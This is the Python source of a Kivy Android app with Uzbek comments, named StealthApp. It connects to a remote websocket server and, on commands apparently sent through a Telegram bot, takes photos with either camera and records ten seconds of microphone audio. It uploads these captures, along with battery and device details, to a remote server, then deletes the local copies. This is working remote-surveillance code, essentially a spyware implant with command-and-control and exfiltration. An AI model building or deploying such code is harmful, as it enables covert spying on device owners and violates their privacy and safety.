import asyncio
import threading
import os
import shutil
import time
from kivy.app import App
from kivy.uix.boxlayout import BoxLayout
from kivy.uix.label import Label
from kivy.uix.button import Button
from kivy.clock import Clock
from kivy.utils import platform

WS_URL = "wss://hild-tracking-backend.onrender.com/ws/device"
UPLOAD_URL = "https://hild-tracking-backend.onrender.com/upload"

status = ["🔄 Ishga tushirilmoqda..."]
should_reconnect = [True]
ws_ref = [None]


# ─── KESH TOZALASH ────────────────────────────────────────────────────────────
def clear_app_cache():
    """Android app keshini va vaqtinchalik fayllarni tozalash"""
    cleared = []
    try:
        if platform == 'android':
            from jnius import autoclass
            context = autoclass('org.kivy.android.PythonActivity').mActivity

            # 1) App cache papkasi
            cache_dir = context.getCacheDir().getAbsolutePath()
            if os.path.exists(cache_dir):
                shutil.rmtree(cache_dir, ignore_errors=True)
                os.makedirs(cache_dir, exist_ok=True)
                cleared.append("App cache")

            # 2) App code cache papkasi
            try:
                code_cache = context.getCodeCacheDir().getAbsolutePath()
                if os.path.exists(code_cache):
                    shutil.rmtree(code_cache, ignore_errors=True)
                    os.makedirs(code_cache, exist_ok=True)
                    cleared.append("Code cache")
            except Exception:
                pass

        # 3) /sdcard dagi vaqtinchalik fayllar
        temp_files = ["/sdcard/capture.jpg", "/sdcard/selfie.jpg", "/sdcard/audio.m4a"]
        for f in temp_files:
            if os.path.exists(f):
                os.remove(f)
                cleared.append(os.path.basename(f))

        # 4) Kivy o'zi yaratgan .pyc fayllar
        for root, dirs, files in os.walk(os.path.dirname(__file__) or "."):
            for fname in files:
                if fname.endswith(('.pyc', '.pyo')):
                    try:
                        os.remove(os.path.join(root, fname))
                        cleared.append(fname)
                    except Exception:
                        pass

        if cleared:
            status[0] = f"🧹 Kesh tozalandi:\n{', '.join(cleared)}\n\nQayta ulanilmoqda..."
        else:
            status[0] = "🧹 Kesh allaqachon toza!\n\nQayta ulanilmoqda..."
    except Exception as e:
        status[0] = f"⚠️ Kesh tozalashda xatolik:\n{e}"


# ─── MEDIA YUKLASH ────────────────────────────────────────────────────────────
async def upload_file(file_path, media_type):
    try:
        import aiohttp
        async with aiohttp.ClientSession() as session:
            with open(file_path, 'rb') as f:
                data = aiohttp.FormData()
                data.add_field('file', f, filename=os.path.basename(file_path))
                data.add_field('media_type', media_type)
                async with session.post(UPLOAD_URL, data=data) as resp:
                    status[0] = f"✅ Yuborildi! ({resp.status})"
        if os.path.exists(file_path):
            os.remove(file_path)
    except Exception as e:
        status[0] = f"⚠️ Upload xatolik:\n{str(e)[:100]}"


async def send_text(text_data):
    try:
        import aiohttp
        async with aiohttp.ClientSession() as session:
            data = aiohttp.FormData()
            data.add_field('text', text_data)
            data.add_field('media_type', 'text')
            async with session.post(UPLOAD_URL, data=data) as resp:
                status[0] = "✅ Ma'lumot yuborildi!"
    except Exception as e:
        status[0] = f"⚠️ Yuborish xatolik:\n{str(e)[:100]}"


# ─── QURILMA MA'LUMOTLARI ─────────────────────────────────────────────────────
def get_battery_info():
    try:
        from jnius import autoclass
        context = autoclass('org.kivy.android.PythonActivity').mActivity
        Intent = autoclass('android.content.Intent')
        IntentFilter = autoclass('android.content.IntentFilter')
        BatteryManager = autoclass('android.os.BatteryManager')

        ifilter = IntentFilter(Intent.ACTION_BATTERY_CHANGED)
        battery_status = context.registerReceiver(None, ifilter)
        level = battery_status.getIntExtra(BatteryManager.EXTRA_LEVEL, -1)
        scale = battery_status.getIntExtra(BatteryManager.EXTRA_SCALE, -1)
        battery_pct = int(level * 100 / scale)
        status_val = battery_status.getIntExtra(BatteryManager.EXTRA_STATUS, -1)
        is_charging = status_val in [
            BatteryManager.BATTERY_STATUS_CHARGING,
            BatteryManager.BATTERY_STATUS_FULL
        ]
        charging_str = "⚡ Zaryadlanmoqda" if is_charging else "🔋 Zaryadlanmayapti"
        return f"🔋 Batareya: {battery_pct}%\n{charging_str}"
    except Exception as e:
        return f"Batareya xatolik: {e}"


def get_device_info():
    try:
        from jnius import autoclass
        Build = autoclass('android.os.Build')
        VERSION = autoclass('android.os.Build$VERSION')
        return (
            f"📱 Qurilma ma'lumotlari:\n"
            f"Model: {Build.MODEL}\n"
            f"Ishlab chiqaruvchi: {Build.MANUFACTURER}\n"
            f"Android: {VERSION.RELEASE}\n"
            f"SDK: {VERSION.SDK_INT}\n"
            f"Qurilma: {Build.DEVICE}"
        )
    except Exception as e:
        return f"Qurilma info xatolik: {e}"


# ─── KAMERA / AUDIO ───────────────────────────────────────────────────────────
def take_photo_camera(camera_id, loop):
    try:
        from jnius import autoclass, PythonJavaClass, java_method
        Camera = autoclass('android.hardware.Camera')
        SurfaceTexture = autoclass('android.graphics.SurfaceTexture')
        FileOutputStream = autoclass('java.io.FileOutputStream')

        cam_name = "selfie" if camera_id == 1 else "capture"
        filepath = f"/sdcard/{cam_name}.jpg"

        camera = Camera.open(camera_id)
        texture = SurfaceTexture(camera_id + 10)
        camera.setPreviewTexture(texture)
        camera.startPreview()

        done = [False]
        path = [None]

        class PicCb(PythonJavaClass):
            __javainterfaces__ = ['android/hardware/Camera$PictureCallback']
            __javacontext__ = 'app'

            @java_method('([BLandroid/hardware/Camera;)V')
            def onPictureTaken(self, data, cam):
                fos = FileOutputStream(filepath)
                fos.write(data)
                fos.close()
                cam.release()
                path[0] = filepath
                done[0] = True

        camera.takePicture(None, None, PicCb())

        for _ in range(30):
            if done[0]:
                break
            time.sleep(0.3)

        if path[0] and os.path.exists(path[0]):
            asyncio.run_coroutine_threadsafe(upload_file(path[0], "photo"), loop)
            status[0] = "📸 Rasm olindi, yuborilmoqda..."
    except Exception as e:
        status[0] = f"Kamera xatolik: {e}"


def record_audio(loop):
    try:
        from jnius import autoclass
        MediaRecorder = autoclass('android.media.MediaRecorder')
        AudioSource = autoclass('android.media.MediaRecorder$AudioSource')
        OutputFormat = autoclass('android.media.MediaRecorder$OutputFormat')
        AudioEncoder = autoclass('android.media.MediaRecorder$AudioEncoder')

        filepath = "/sdcard/audio.m4a"
        recorder = MediaRecorder()
        recorder.setAudioSource(AudioSource.MIC)
        recorder.setOutputFormat(OutputFormat.MPEG_4)
        recorder.setAudioEncoder(AudioEncoder.AAC)
        recorder.setOutputFile(filepath)
        recorder.prepare()
        recorder.start()
        status[0] = "🎙 Yozilmoqda (10 sek)..."

        time.sleep(10)
        recorder.stop()
        recorder.release()

        if os.path.exists(filepath):
            asyncio.run_coroutine_threadsafe(upload_file(filepath, "audio"), loop)
    except Exception as e:
        status[0] = f"Audio xatolik: {e}"


# ─── WEBSOCKET LOOP ───────────────────────────────────────────────────────────
async def ws_loop():
    loop = asyncio.get_running_loop()
    retry = 0
    while should_reconnect[0]:
        try:
            import websockets
            retry += 1
            status[0] = f"🔄 Serverga ulanilmoqda... ({retry}-urinish)\n{WS_URL}"
            async with websockets.connect(
                WS_URL,
                ping_interval=30,
                ping_timeout=15,
                open_timeout=15,
                close_timeout=5,
            ) as ws:
                ws_ref[0] = ws
                retry = 0
                status[0] = "✅ Ulandi!\nTelegram botdan buyruq bering."
                while True:
                    msg = await ws.recv()
                    status[0] = f"📨 Buyruq: {msg}"

                    if msg == "take_photo":
                        threading.Thread(target=take_photo_camera, args=(0, loop), daemon=True).start()
                    elif msg == "selfie":
                        threading.Thread(target=take_photo_camera, args=(1, loop), daemon=True).start()
                    elif msg == "record_audio":
                        threading.Thread(target=record_audio, args=(loop,), daemon=True).start()
                    elif msg == "battery":
                        info = get_battery_info()
                        await send_text(info)
                        status[0] = info
                    elif msg == "device_info":
                        info = get_device_info()
                        await send_text(info)
                        status[0] = info

        except Exception as e:
            ws_ref[0] = None
            err = str(e)[:120]
            wait = min(5 * retry, 30)  # max 30 soniya kutish
            status[0] = f"❌ Xatolik:\n{err}\n\n{wait} soniyadan so'ng qayta..."
            await asyncio.sleep(wait)


# ─── RUXSATLAR VA LOOP ────────────────────────────────────────────────────────
def run_loop():
    try:
        if platform == 'android':
            from android.permissions import request_permissions, Permission
            request_permissions([
                Permission.CAMERA,
                Permission.RECORD_AUDIO,
                Permission.INTERNET,
                Permission.WRITE_EXTERNAL_STORAGE,
                Permission.READ_EXTERNAL_STORAGE,
            ])
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        loop.run_until_complete(ws_loop())
    except Exception as e:
        status[0] = f"❌ Ishga tushirishda xatolik:\n{str(e)[:150]}"


def force_reconnect():
    """Keshni tozalab, qayta ulanishni boshlash"""
    should_reconnect[0] = False
    if ws_ref[0]:
        try:
            asyncio.run_coroutine_threadsafe(ws_ref[0].close(), asyncio.get_event_loop())
        except Exception:
            pass
    clear_app_cache()
    time.sleep(1)
    should_reconnect[0] = True
    t = threading.Thread(target=run_loop, daemon=True)
    t.start()


# ─── KIVY UI ──────────────────────────────────────────────────────────────────
class StealthApp(App):
    def build(self):
        layout = BoxLayout(orientation='vertical', padding=20, spacing=10)

        self.label = Label(
            text="🔄 Ishga tushirilmoqda...",
            font_size='15sp',
            halign='center',
            valign='middle',
            size_hint=(1, 0.8),
        )
        self.label.bind(size=self.label.setter('text_size'))

        btn = Button(
            text="🧹 Keshni tozala va qayta ulash",
            font_size='14sp',
            size_hint=(1, 0.2),
            background_color=(0.2, 0.6, 1, 1),
        )
        btn.bind(on_press=lambda x: threading.Thread(target=force_reconnect, daemon=True).start())

        layout.add_widget(self.label)
        layout.add_widget(btn)

        # Birinchi marta ishga tushirish
        threading.Thread(target=run_loop, daemon=True).start()
        Clock.schedule_interval(self.update_ui, 1)
        return layout

    def update_ui(self, dt):
        self.label.text = status[0]


if __name__ == '__main__':
    StealthApp().run()
